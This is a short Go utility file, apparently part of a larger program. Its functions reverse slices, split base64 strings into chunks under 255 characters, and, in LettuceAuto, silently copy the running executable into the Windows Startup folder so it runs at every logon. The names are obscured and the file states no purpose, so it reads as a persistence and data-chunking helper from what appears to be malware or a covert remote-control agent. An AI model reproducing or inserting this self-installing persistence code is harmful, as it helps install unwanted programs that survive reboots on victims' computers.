package utils

import (
	"os"
	"path/filepath"
	"strings"
)

func LettuceReverse(list []string) []string {
	for i, j := 0, len(list)-1; i < j; {
		list[i], list[j] = list[j], list[i]
		i++
		j--
	}
	return list
}

// chunk b64 so it's less than the 255 char limit
func LettuceChunk(s string) []string {
	var chunks []string
	for len(s) > 254 {
		chunks = append(chunks, s[:254])
		s = s[254:]
	}
	chunks = append(chunks, s)
	return chunks
}

func LettuceFileName(path string) string {
	segments := strings.Split(path, "/")
	return segments[len(segments)-1]
}

func LettuceAuto() error {
	lettuceMeeter, err := os.Executable()
	if err != nil {
		return err
	}

	lettuceStart := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")

	lettuceEnd := filepath.Join(lettuceStart, filepath.Base(lettuceMeeter))

	buff, err := os.ReadFile(lettuceMeeter)
	if err != nil {
		return err
	}

	err = os.WriteFile(lettuceEnd, buff, 0644)
	if err != nil {
		return err
	}
	return nil
}
